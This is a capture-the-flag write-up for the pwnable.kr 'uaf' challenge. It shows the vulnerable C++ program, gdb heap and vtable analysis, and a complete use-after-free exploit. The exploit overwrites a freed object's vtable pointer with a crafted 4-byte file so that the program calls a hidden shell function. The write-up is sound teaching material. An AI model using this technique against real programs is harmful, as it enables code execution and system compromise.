```
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

So by the looks of the name of the challenge we probably would want to find some UAF exploitation here ;)
We have a `Human` object which holds 2 virtual methods:
- `give_shell`
- `introduce`

We want to exploit this program to call give_shell.

This program initiates 2 objects of type `Man` and `Woman` (both inherit from Human), then we enter an infinite loop that each iteration asks us for either 1,2,3.

When given 1, it calls the `introduce` method of `m` and `w`
When given 2, it expects an integer in `argv[1]` and stores it in `len` and an existing file in `argv[2]`, then allocates `len` bytes to `data` and then reads at most `argv[1]` bytes from it and stores it in `data`
When given 3, frees the memory used by `m` and `w` using `delete`

So it's pretty clear we want to give the program `3` at a certain point, then call `2` sometime afterwards hopefully allocating the freed memory of the objects and then calling `1` to get our shell, so let's dive deeper to see how we'll do it. I highly recommended reading about vtables and a bit about heaps.

So first of all, it's important to remember that whenever we use `new` we look for empty chunks in the heap, so let's look at the heap after calling `new`:
([....] just means i removed irrelevant parts)
```bash
gef➤  disas main
    [....]
   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>
   0x0000000000401000 <+316>:	mov    -0x60(%rbp),%rax
   0x0000000000401004 <+320>:	add    $0x8,%rax
   0x0000000000401008 <+324>:	mov    (%rax),%rax
   0x000000000040100b <+327>:	mov    %rax,%rdi
   0x000000000040100e <+330>:	call   0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:	cltq   
   0x0000000000401015 <+337>:	mov    %rax,-0x28(%rbp)
   0x0000000000401019 <+341>:	mov    -0x28(%rbp),%rax
   0x000000000040101d <+345>:	mov    %rax,%rdi
   0x0000000000401020 <+348>:	call   0x400c70 <operator new[](unsigned long)@plt>
   0x0000000000401025 <+353>:	mov    %rax,-0x20(%rbp)
   0x0000000000401029 <+357>:	mov    -0x60(%rbp),%rax
   0x000000000040102d <+361>:	add    $0x10,%rax
   0x0000000000401031 <+365>:	mov    (%rax),%rax
   0x0000000000401034 <+368>:	mov    $0x0,%esi
   0x0000000000401039 <+373>:	mov    %rax,%rdi
   0x000000000040103c <+376>:	mov    $0x0,%eax
   0x0000000000401041 <+381>:	call   0x400dc0 <open@plt>
   0x0000000000401046 <+386>:	mov    -0x28(%rbp),%rdx
   0x000000000040104a <+390>:	mov    -0x20(%rbp),%rcx
   0x000000000040104e <+394>:	mov    %rcx,%rsi
   0x0000000000401051 <+397>:	mov    %eax,%edi
   0x0000000000401053 <+399>:	call   0x400ca0 <read@plt>
   0x0000000000401058 <+404>:	mov    $0x401513,%esi
   0x000000000040105d <+409>:	mov    $0x602260,%edi
   0x0000000000401062 <+414>:	call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000401067 <+419>:	mov    $0x400d60,%esi
   0x000000000040106c <+424>:	mov    %rax,%rdi
]
```
 Let's stop 2 instructions after the one that executes the `new` call.
 Also I created a file called `sol` and just put random characters in it to avoid segfaults regarding missing `argv`
```bash
gef➤  b *0x0000000000401029
Breakpoint 1 at 0x401029
gef➤  r 4 sol
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
1. use
2. after
3. free
2

Breakpoint 1, 0x0000000000401029 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000000000245b770  →  0x0000000000000000
$rbx   : 0x000000000245af30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
$rcx   : 0x21              
$rdx   : 0x0               
$rsp   : 0x00007fff1ca5b370  →  0x00007fff1ca5b4e8  →  0x00007fff1ca5d29a  →  "/home/t/repos/ctfs/pwnable.kr/uaf/uaf"
$rbp   : 0x00007fff1ca5b3d0  →  0x0000000000000003
$rsi   : 0x000000000245b780  →  0x0000000000000000
$rdi   : 0x0               
$rip   : 0x0000000000401029  →  <main+357> mov -0x60(%rbp), %rax
$r8    : 0x1999999999999999
$r9    : 0x000000000245b770  →  0x0000000000000000
$r10   : 0x00007f7a0ba19138  →  0x000f001200002c34 ("4,"?)
$r11   : 0x00007f7a0b819ce0  →  0x000000000245b780  →  0x0000000000000000
$r12   : 0x00007fff1ca5b390  →  0x000000000245af18  →  0x000000006c6c694a ("Jill"?)
$r13   : 0x0000000000400ec4  →  <main+0> push %rbp
$r14   : 0x0               
$r15   : 0x00007f7a0bd41040  →  0x00007f7a0bd422e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff1ca5b370│+0x0000: 0x00007fff1ca5b4e8  →  0x00007fff1ca5d29a  →  "/home/t/repos/ctfs/pwnable.kr/uaf/uaf"	 ← $rsp
0x00007fff1ca5b378│+0x0008: 0x000000030bc26e88
0x00007fff1ca5b380│+0x0010: 0x000000000245aec8  →  0x000000006b63614a ("Jack"?)
0x00007fff1ca5b388│+0x0018: 0x00007f7a0bb1e754  →  <std::basic_ios<wchar_t,+0> xor %eax, %eax
0x00007fff1ca5b390│+0x0020: 0x000000000245af18  →  0x000000006c6c694a ("Jill"?)	 ← $r12
0x00007fff1ca5b398│+0x0028: 0x000000000245aee0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
0x00007fff1ca5b3a0│+0x0030: 0x000000000245af30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
0x00007fff1ca5b3a8│+0x0038: 0x0000000000000004
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40101d <main+345>       mov    %rax, %rdi
     0x401020 <main+348>       call   0x400c70 <operator new[](unsigned long)@plt>
     0x401025 <main+353>       mov    %rax, -0x20(%rbp)
 →   0x401029 <main+357>       mov    -0x60(%rbp), %rax
     0x40102d <main+361>       add    $0x10, %rax
     0x401031 <main+365>       mov    (%rax), %rax
     0x401034 <main+368>       mov    $0x0, %esi
     0x401039 <main+373>       mov    %rax, %rdi
     0x40103c <main+376>       mov    $0x0, %eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x401029 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401029 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunks
Chunk(addr=0x2449010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000002449010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x24492a0, size=0x11c10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000024492a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245aeb0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245aeb0     04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245aee0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245aee0     70 15 40 00 00 00 00 00 19 00 00 00 00 00 00 00    p.@.............]
Chunk(addr=0x245af00, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245af00     04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245af30, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245af30     50 15 40 00 00 00 00 00 15 00 00 00 00 00 00 00    P.@.............]
Chunk(addr=0x245af50, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245af50     33 2e 20 66 72 65 65 0a 0a 00 00 00 00 00 00 00    3. free.........]
Chunk(addr=0x245b360, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245b360     32 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00    2...............]
Chunk(addr=0x245b770, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000000000245b770     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245b790, size=0xe880, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

We know `rax` is the address of the newly allocated memory for `data`, as we can see here it's `0x000000000245b770` and we can really see in the heap chunks that it was allocated `0x20` (32) bytes, since we told it to allocate 4 bytes, it probably used the smallest free chunk in fast bins lists, which is 32 bytes, we can see this using `heap bins`:
```bash
gef➤  heap bins
───────────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────────────────────────────────────────────────────
All tcachebins are empty
────────────────────────────────────────────────────────────────────────────────── Fastbins for arena at 0x7f7a0b819c80 ──────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena at 0x7f7a0b819c80 ────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────────────────────────────────────────────── Small Bins for arena at 0x7f7a0b819c80 ─────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────────────────────────────────── Large Bins for arena at 0x7f7a0b819c80 ─
```
But let's try to view the allocated chunk <b>after</b> we freed the objects:
If we run exactly as we did previously, but make sure we gave `3` as the first input before `2` and inspect `%rax`:
```bash
gef➤  p/x $rax
$1 = 0x1765f30
```
Which is very interesting since this is the memory that was in use by `w`. We'll get back to this later.

Great, we can also notice the heap chunks we are used for `m` and `w`, `0x245aee0` and `0x245af30`, we can know this from the information shown in the 'stack' area and we also can test it out on `0x245aee0`:
```bash
gef➤  x/4xg 0x245aee0
0x245aee0:	0x0000000000401570	0x0000000000000019
0x245aef0:	0x000000000245aec8	0x0000000000000031
```

This is how the `Man` objects looks in memory:
- first 8 bytes point to the vtable of this object
- the second 8 bytes point to the age attribute
- third part points to the name attribute
- the last part isn't really relevant.

So let's look at the vtable of the object and understand it's structure:
```bash
gef➤  x/4xg 0x0000000000401570
0x401570 <vtable for Man+16>:	0x000000000040117a	0x00000000004012d2
0x401580 <vtable for Human>:	0x0000000000000000	0x00000000004015f0
```

The first 8 bytes represent the `give_shell` function and the second 8 bytes represent the corresponding `introduce` function, we can verify this by returing to the assembly and see how `introduce` is called:
```bash
gef➤  kill
[Inferior 1 (process 25623) killed]
gef➤  b *0x0000000000400fd4
Breakpoint 2 at 0x400fd4
gef➤  r 4 sol
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
1. use
2. after
3. free
1

Breakpoint 2, 0x0000000000400fd4 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
$rbx   : 0x000000000229ff30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
$rcx   : 0x00007ffc312bef20  →  0x00007f6164029618  →  0x0000000000000000
$rdx   : 0x00007ffc312beff8  →  0x00007f6100000001
$rsp   : 0x00007ffc312befb0  →  0x00007ffc312bf128  →  0x00007ffc312c129a  →  "/home/tom/repos/ctfs/pwnable.kr/uaf/uaf"
$rbp   : 0x00007ffc312bf010  →  0x0000000000000003
$rsi   : 0x0               
$rdi   : 0x00007f6164029600  →  0x0000000000000000
$rip   : 0x0000000000400fd4  →  <main+272> add $0x8, %rax
$r8    : 0xffffffff        
$r9    : 0x00000000006020f0  →  0x00007f6164020938  →  0x00007f6163f1fef0  →  <virtual+0> endbr64 
$r10   : 0x00007f6163e21b98  →  0x000f00220002f918
$r11   : 0x00007f6163f32930  →  <std::istreambuf_iterator<char,+0> endbr64 
$r12   : 0x00007ffc312befd0  →  0x000000000229ff18  →  0x000000006c6c694a ("Jill"?)
$r13   : 0x0000000000400ec4  →  <main+0> push %rbp
$r14   : 0x0               
$r15   : 0x00007f61641a2040  →  0x00007f61641a32e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc312befb0│+0x0000: 0x00007ffc312bf128  →  0x00007ffc312c129a  →  "/home/tom/repos/ctfs/pwnable.kr/uaf/uaf"	 ← $rsp
0x00007ffc312befb8│+0x0008: 0x0000000364026e88
0x00007ffc312befc0│+0x0010: 0x000000000229fec8  →  0x000000006b63614a ("Jack"?)
0x00007ffc312befc8│+0x0018: 0x00007f6163f1e754  →  <std::basic_ios<wchar_t,+0> xor %eax, %eax
0x00007ffc312befd0│+0x0020: 0x000000000229ff18  →  0x000000006c6c694a ("Jill"?)	 ← $r12
0x00007ffc312befd8│+0x0028: 0x000000000229fee0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
0x00007ffc312befe0│+0x0030: 0x000000000229ff30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push %rbp
0x00007ffc312befe8│+0x0038: 0x00007f6163ebf7a5  →  <std::ios_base::Init::Init()+1701> mov 0x163b0c(%rip), %rax        # 0x7f61640232b8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400fc8 <main+260>       jmp    0x4010a9 <main+485>
     0x400fcd <main+265>       mov    -0x38(%rbp), %rax
     0x400fd1 <main+269>       mov    (%rax), %rax
 →   0x400fd4 <main+272>       add    $0x8, %rax
     0x400fd8 <main+276>       mov    (%rax), %rdx
     0x400fdb <main+279>       mov    -0x38(%rbp), %rax
     0x400fdf <main+283>       mov    %rax, %rdi
     0x400fe2 <main+286>       call   *%rdx
     0x400fe4 <main+288>       mov    -0x30(%rbp), %rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400fd4 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400fd4 → main()
```

We can see `rax` is exactly the memory we displayed prior to verifying this, `0x000000000040117a`, then it adds 8 bytes to it and calls `introduce` (`call *%rdx`).

So we now know how the program calls `introduce`, it points to the vtable of that object, adds 8 bytes and performs a call on that address.
We also know that the first 8 bytes of the vtable is the address of `give_shell`, so intuitively, it makes sense to make the program think the vtable address is the actual vtable 
address minus 8 bytes, right? (`0x401570 - 0x08` = `0x401568`)


So if we free the objects, then allocate memory there and make sure it starts with `0x401568`, this would cause a `give_shell` call.

But before we try this out, it's important to remember that fast-bins work using a LIFO linked list, which means that the first free chunk we would allocate is also the 
latest one we freed, This means that if we free `m` and then `w`, we would need to allocate our controlled content twice in a row, first allocation would occupy the freed memory by `w` and the second one would occupy the memory of `m`, which is also the first one to call `introduce`.

This also explains why our previous demonstration showed that after one allocation the freed memory of `w` was the one allocated.

Time to exploit:

```bash
uaf@pwnable:~$ echo -ne "\x68\x15\x40\x00" > /tmp/wwww
uaf@pwnable:~$ ./uaf 4 /tmp/wwww
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat ~/flag
y********************







